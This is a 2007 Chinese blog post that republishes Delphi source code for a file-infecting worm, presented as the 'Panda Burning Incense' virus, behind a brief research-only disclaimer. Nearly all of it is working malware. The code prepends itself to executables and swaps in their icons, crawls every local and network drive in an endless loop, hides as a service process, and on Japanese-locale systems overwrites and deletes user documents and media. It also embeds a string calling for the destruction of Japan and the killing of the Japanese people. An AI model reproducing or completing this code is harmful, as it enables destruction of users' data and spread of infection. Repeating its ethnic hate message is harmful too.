---
layout: post
status: publish
published: true
title: "熊猫烧香源代码"
author: Leask




author_login: leask
author_email: i@leaskh.com
author_url: http://www.leaskh.com
wordpress_id: 358
wordpress_url: http://leaskh.wordpress.com/2007/03/05/%e7%86%8a%e7%8c%ab%e7%83%a7%e9%a6%99%e6%ba%90%e4%bb%a3%e7%a0%81
date: '2007-03-05 04:56:18 +0800'
date_gmt: '2007-03-05 04:56:18 +0800'
categories:
- Computers and Internet
tags: []
comments: []
---
<div id="msgcns!15BAC1A170471DB!2154" class="bvMsg">声明：<br />
<br />以下代码为网上收集，本人不保证其真实性。<br />
<br />调试以下代码存在数据风险，敬请留意。<br />
<br />以下代码仅供原理分析或参考研究，禁止用于非法用途。<br />
<br />如任何人由于以下代码的发布蒙受任何损失均不为本Space责任。<br />
<br /><br />
<br />Leask Huang<br />
<br />March 5, 2007<br />
<br /><br />
<br /><br />
<hr />
熊猫烧香源代码：<br />
<br /><br />
<br />program Japussy;<br />uses<br />&nbsp; Windows, SysUtils, Classes, Graphics, ShellAPI&#123;, Registry&#125;;<br />const<br />&nbsp; HeaderSize = 82432;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //病毒体的大小<br />&nbsp; IconOffset = $12EB8;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //PE文件主图标的偏移量<br />&nbsp; <br />&nbsp; //在我的Delphi5 SP1上面编译得到的大小，其它版本的Delphi可能不同<br />&nbsp; //查找2800000020的十六进制字符串可以找到主图标的偏移量<br />&nbsp;&nbsp; <br />&#123;<br />&nbsp; HeaderSize = 38912;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //Upx压缩过病毒体的大小<br />&nbsp; IconOffset = $92BC;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //Upx压缩过PE文件主图标的偏移量<br />&nbsp; <br />&nbsp; //Upx 1.24W 用法: upx -9 --8086 Japussy.exe<br />&#125;<br />&nbsp; IconSize&nbsp;&nbsp; = $2E8;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //PE文件主图标的大小--744字节<br />&nbsp; IconTail&nbsp;&nbsp; = IconOffset + IconSize;&nbsp; //PE文件主图标的尾部<br />&nbsp; ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = $44444444;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //感染标记<br />&nbsp; <br />&nbsp; //垃圾码，以备写入<br />&nbsp; Catchword = 'If a race need to be killed out, it must be Yamato. ' +<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'If a country need to be destroyed, it must be Japan! ' +<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '*** W32.Japussy.Worm.A ***';<br />&#123;$R *.RES&#125;<br />function RegisterServiceProcess(dwProcessID, dwType: Integer): Integer; <br />&nbsp; stdcall; external 'Kernel32.dll'; //函数声明<br />var<br />&nbsp; TmpFile: string;<br />&nbsp; Si:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; STARTUPINFO;<br />&nbsp; Pi:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PROCESS_INFORMATION;<br />&nbsp; IsJap:&nbsp;&nbsp; Boolean = False; //日文操作系统标记<br />&#123; 判断是否为Win9x &#125;<br />function IsWin9x: Boolean;<br />var<br />&nbsp; Ver: TOSVersionInfo;<br />begin<br />&nbsp; Result := False;<br />&nbsp; Ver.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);<br />&nbsp; if not GetVersionEx(Ver) then<br />&nbsp;&nbsp;&nbsp; Exit;<br />&nbsp; if (Ver.dwPlatformID = VER_PLATFORM_WIN32_WINDOWS) then //Win9x<br />&nbsp;&nbsp;&nbsp; Result := True;<br />end;<br />&#123; 在流之间复制 &#125;<br />procedure CopyStream(Src: TStream; sStartPos: Integer; Dst: TStream;<br />&nbsp; dStartPos: Integer; Count: Integer);<br />var<br />&nbsp; sCurPos, dCurPos: Integer;<br />begin<br />&nbsp; sCurPos := Src.Position;<br />&nbsp; dCurPos := Dst.Position;<br />&nbsp; Src.Seek(sStartPos, 0);<br />&nbsp; Dst.Seek(dStartPos, 0);<br />&nbsp; Dst.CopyFrom(Src, Count);<br />&nbsp; Src.Seek(sCurPos, 0);<br />&nbsp; Dst.Seek(dCurPos, 0);<br />end;<br />&#123; 将宿主文件从已感染的PE文件中分离出来，以备使用 &#125;<br />procedure ExtractFile(FileName: string);<br />var<br />&nbsp; sStream, dStream: TFileStream;<br />begin<br />&nbsp; try<br />&nbsp;&nbsp;&nbsp; sStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);<br />&nbsp;&nbsp;&nbsp; try<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dStream := TFileStream.Create(FileName, fmCreate);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sStream.Seek(HeaderSize, 0); //跳过头部的病毒部分<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dStream.CopyFrom(sStream, sStream.Size - HeaderSize);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; finally<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dStream.Free;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br />&nbsp;&nbsp;&nbsp; finally<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sStream.Free;<br />&nbsp;&nbsp;&nbsp; end;<br />&nbsp; except<br />&nbsp; end;<br />end;<br />&#123; 填充STARTUPINFO结构 &#125;<br />procedure FillStartupInfo(var Si: STARTUPINFO; State: Word);<br />begin<br />&nbsp; Si.cb := SizeOf(Si);<br />&nbsp; Si.lpReserved := nil;<br />&nbsp; Si.lpDesktop := nil;<br />&nbsp; Si.lpTitle := nil;<br />&nbsp; Si.dwFlags := STARTF_USESHOWWINDOW;<br />&nbsp; Si.wShowWindow := State;<br />&nbsp; Si.cbReserved2 := 0;<br />&nbsp; Si.lpReserved2 := nil;<br />end;<br />&#123; 发带毒邮件 &#125;<br />procedure SendMail;<br />begin<br />&nbsp; //哪位仁兄愿意完成之？<br />end;<br />&#123; 感染PE文件 &#125;<br />procedure InfectOneFile(FileName: string);<br />var<br />&nbsp; HdrStream, SrcStream: TFileStream;<br />&nbsp; IcoStream, DstStream: TMemoryStream;<br />&nbsp; iID: LongInt;<br />&nbsp; aIcon: TIcon;<br />&nbsp; Infected, IsPE: Boolean;<br />&nbsp; i: Integer;<br />&nbsp; Buf: array[0..1] of Char;<br />begin<br />&nbsp; try //出错则文件正在被使用，退出<br />&nbsp;&nbsp;&nbsp; if CompareText(FileName, 'JAPUSSY.EXE') = 0 then //是自己则不感染<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Exit;<br />&nbsp;&nbsp;&nbsp; Infected := False;<br />&nbsp;&nbsp;&nbsp; IsPE&nbsp;&nbsp;&nbsp;&nbsp; := False;<br />&nbsp;&nbsp;&nbsp; SrcStream := TFileStream.Create(FileName, fmOpenRead);<br />&nbsp;&nbsp;&nbsp; try<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for i := 0 to $108 do //检查PE文件头<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream.Seek(i, soFromBeginning);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream.Read(Buf, 2);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (Buf[0] = #80) and (Buf[1] = #69) then //PE标记<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IsPE := True; //是PE文件<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Break;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream.Seek(-4, soFromEnd); //检查感染标记<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream.Read(iID, 4);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (iID = ID) or (SrcStream.Size < 10240) then //太小的文件不感染<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Infected := True;<br />&nbsp;&nbsp;&nbsp; finally<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream.Free;<br />&nbsp;&nbsp;&nbsp; end;<br />&nbsp;&nbsp;&nbsp; if Infected or (not IsPE) then //如果感染过了或不是PE文件则退出<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Exit;<br />&nbsp;&nbsp;&nbsp; IcoStream := TMemoryStream.Create;<br />&nbsp;&nbsp;&nbsp; DstStream := TMemoryStream.Create;<br />&nbsp;&nbsp;&nbsp; try<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aIcon := TIcon.Create;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //得到被感染文件的主图标(744字节)，存入流<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aIcon.ReleaseHandle;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aIcon.Handle := ExtractIcon(HInstance, PChar(FileName), 0);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aIcon.SaveToStream(IcoStream);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; finally<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aIcon.Free;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream := TFileStream.Create(FileName, fmOpenRead);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //头文件<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HdrStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //写入病毒体主图标之前的数据<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CopyStream(HdrStream, 0, DstStream, 0, IconOffset);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //写入目前程序的主图标<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CopyStream(IcoStream, 22, DstStream, IconOffset, IconSize);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //写入病毒体主图标到病毒体尾部之间的数据<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CopyStream(HdrStream, IconTail, DstStream, IconTail, HeaderSize - IconTail);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //写入宿主程序<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CopyStream(SrcStream, 0, DstStream, HeaderSize, SrcStream.Size);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //写入已感染的标记<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DstStream.Seek(0, 2);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iID := $44444444;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DstStream.Write(iID, 4);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; finally<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HdrStream.Free;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br />&nbsp;&nbsp;&nbsp; finally<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream.Free;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IcoStream.Free;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DstStream.SaveToFile(FileName); //替换宿主文件<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DstStream.Free;<br />&nbsp;&nbsp;&nbsp; end;<br />&nbsp; except;<br />&nbsp; end;<br />end;<br /><br />&#123; 将目标文件写入垃圾码后删除 &#125;<br />procedure SmashFile(FileName: string);<br />var<br />&nbsp; FileHandle: Integer;<br />&nbsp; i, Size, Mass, Max, Len: Integer;<br />begin<br />&nbsp; try<br />&nbsp;&nbsp;&nbsp; SetFileAttributes(PChar(FileName), 0); //去掉只读属性<br />&nbsp;&nbsp;&nbsp; FileHandle := FileOpen(FileName, fmOpenWrite); //打开文件<br />&nbsp;&nbsp;&nbsp; try<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Size := GetFileSize(FileHandle, nil); //文件大小<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i := 0;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Randomize;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Max := Random(15); //写入垃圾码的随机次数<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if Max < 5 then<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Max := 5;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Mass := Size div Max; //每个间隔块的大小<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Len := Length(Catchword);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while i < Max do<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FileSeek(FileHandle, i * Mass, 0); //定位<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //写入垃圾码，将文件彻底破坏掉<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FileWrite(FileHandle, Catchword, Len);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Inc(i);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br />&nbsp;&nbsp;&nbsp; finally<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FileClose(FileHandle); //关闭文件<br />&nbsp;&nbsp;&nbsp; end;<br />&nbsp;&nbsp;&nbsp; DeleteFile(PChar(FileName)); //删除之<br />&nbsp; except<br />&nbsp; end;<br />end;<br />&#123; 获得可写的驱动器列<br />
表 &#125;<br />function GetDrives: string;<br />var<br />&nbsp; DiskType: Word;<br />&nbsp; D: Char;<br />&nbsp; Str: string;<br />&nbsp; i: Integer;<br />begin<br />&nbsp; for i := 0 to 25 do //遍历26个字母<br />&nbsp; begin<br />&nbsp;&nbsp;&nbsp; D := Chr(i + 65);<br />&nbsp;&nbsp;&nbsp; Str := D + ':';<br />&nbsp;&nbsp;&nbsp; DiskType := GetDriveType(PChar(Str));<br />&nbsp;&nbsp;&nbsp; //得到本地磁盘和网络盘<br />&nbsp;&nbsp;&nbsp; if (DiskType = DRIVE_FIXED) or (DiskType = DRIVE_REMOTE) then<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Result := Result + D;<br />&nbsp; end;<br />end;<br />&#123; 遍历目录，感染和摧毁文件 &#125;<br />procedure LoopFiles(Path, Mask: string);<br />var<br />&nbsp; i, Count: Integer;<br />&nbsp; Fn, Ext: string;<br />&nbsp; SubDir: TStrings;<br />&nbsp; SearchRec: TSearchRec;<br />&nbsp; Msg: TMsg;<br />&nbsp; function IsValidDir(SearchRec: TSearchRec): Integer;<br />&nbsp; begin<br />&nbsp;&nbsp;&nbsp; if (SearchRec.Attr <> 16) and&nbsp; (SearchRec.Name <> '.') and<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SearchRec.Name <> '..') then<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Result := 0 //不是目录<br />&nbsp;&nbsp;&nbsp; else if (SearchRec.Attr = 16) and&nbsp; (SearchRec.Name <> '.') and<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SearchRec.Name <> '..') then<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Result := 1 //不是根目录<br />&nbsp;&nbsp;&nbsp; else Result := 2; //是根目录<br />&nbsp; end;<br />begin<br />&nbsp; if (FindFirst(Path + Mask, faAnyFile, SearchRec) = 0) then<br />&nbsp; begin<br />&nbsp;&nbsp;&nbsp; repeat<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PeekMessage(Msg, 0, 0, 0, PM_REMOVE); //调整消息队列，避免引起怀疑<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if IsValidDir(SearchRec) = 0 then<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Fn := Path + SearchRec.Name;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ext := UpperCase(ExtractFileExt(Fn));<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (Ext = '.EXE') or (Ext = '.SCR') then<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InfectOneFile(Fn); //感染可执行文件&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if (Ext = '.HTM') or (Ext = '.HTML') or (Ext = '.ASP') then<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //感染HTML和ASP文件，将Base64编码后的病毒写入<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //感染浏览此网页的所有用户<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //哪位大兄弟愿意完成之？<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if Ext = '.WAB' then //Outlook地址簿文件<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //获取Outlook邮件地址<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if Ext = '.ADC' then //Foxmail地址自动完成文件<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //获取Foxmail邮件地址<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if Ext = 'IND' then //Foxmail地址簿文件<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //获取Foxmail邮件地址<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if IsJap then //是倭文操作系统<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (Ext = '.DOC') or (Ext = '.XLS') or (Ext = '.MDB') or<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Ext = '.MP3') or (Ext = '.RM') or (Ext = '.RA') or<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Ext = '.WMA') or (Ext = '.ZIP') or (Ext = '.RAR') or<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Ext = '.MPEG') or (Ext = '.ASF') or (Ext = '.JPG') or<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Ext = '.JPEG') or (Ext = '.GIF') or (Ext = '.SWF') or<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Ext = '.PDF') or (Ext = '.CHM') or (Ext = '.AVI') then<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SmashFile(Fn); //摧毁文件<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //感染或删除一个文件后睡眠200毫秒，避免CPU占用率过高引起怀疑<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sleep(200);<br />&nbsp;&nbsp;&nbsp; until (FindNext(SearchRec) <> 0);<br />&nbsp; end;<br />&nbsp; FindClose(SearchRec);<br />&nbsp; SubDir := TStringList.Create;<br />&nbsp; if (FindFirst(Path + '*.*', faDirectory, SearchRec) = 0) then<br />&nbsp; begin<br />&nbsp;&nbsp;&nbsp; repeat<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if IsValidDir(SearchRec) = 1 then<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SubDir.Add(SearchRec.Name);<br />&nbsp;&nbsp;&nbsp; until (FindNext(SearchRec) <> 0);<br />&nbsp;&nbsp;&nbsp; end;<br />&nbsp; FindClose(SearchRec);<br />&nbsp; Count := SubDir.Count - 1;<br />&nbsp; for i := 0 to Count do<br />&nbsp;&nbsp;&nbsp; LoopFiles(Path + SubDir.Strings + '', Mask);<br />&nbsp; FreeAndNil(SubDir);<br />end;<br />&#123; 遍历磁盘上所有的文件 &#125;<br />procedure InfectFiles;<br />var<br />&nbsp; DriverList: string;<br />&nbsp; i, Len: Integer;<br />begin<br />&nbsp; if GetACP = 932 then //日文操作系统<br />&nbsp;&nbsp;&nbsp; IsJap := True; //去死吧！<br />&nbsp; DriverList := GetDrives; //得到可写的磁盘列表<br />&nbsp; Len := Length(DriverList);<br />&nbsp; while True do //死循环<br />&nbsp; begin<br />&nbsp;&nbsp;&nbsp; for i := Len downto 1 do //遍历每个磁盘驱动器<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LoopFiles(DriverList + ':', '*.*'); //感染之<br />&nbsp;&nbsp;&nbsp; SendMail; //发带毒邮件<br />&nbsp;&nbsp;&nbsp; Sleep(1000 * 60 * 5); //睡眠5分钟<br />&nbsp; end;<br />end;<br />&#123; 主程序开始 &#125;<br />begin<br />&nbsp; if IsWin9x then //是Win9x<br />&nbsp;&nbsp;&nbsp; RegisterServiceProcess(GetCurrentProcessID, 1) //注册为服务进程<br />&nbsp; else //WinNT<br />&nbsp; begin<br />&nbsp;&nbsp;&nbsp; //远程线程映射到Explorer进程<br />&nbsp;&nbsp;&nbsp; //哪位兄台愿意完成之？<br />&nbsp; end;<br />&nbsp; //如果是原始病毒体自己<br />&nbsp; if CompareText(ExtractFileName(ParamStr(0)), 'Japussy.exe') = 0 then<br />&nbsp;&nbsp;&nbsp; InfectFiles //感染和发邮件<br />&nbsp; else //已寄生于宿主程序上了，开始工作<br />&nbsp; begin<br />&nbsp;&nbsp;&nbsp; TmpFile := ParamStr(0); //创建临时文件<br />&nbsp;&nbsp;&nbsp; Delete(TmpFile, Length(TmpFile) - 4, 4);<br />&nbsp;&nbsp;&nbsp; TmpFile := TmpFile + #32 + '.exe'; //真正的宿主文件，多一个空格<br />&nbsp;&nbsp;&nbsp; ExtractFile(TmpFile); //分离之<br />&nbsp;&nbsp;&nbsp; FillStartupInfo(Si, SW_SHOWDEFAULT);<br />&nbsp;&nbsp;&nbsp; CreateProcess(PChar(TmpFile), PChar(TmpFile), nil, nil, True,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0, nil, '.', Si, Pi); //创建新进程运行之<br />&nbsp;&nbsp;&nbsp; InfectFiles; //感染和发邮件<br />&nbsp; end;<br />end. <br /></div></p>
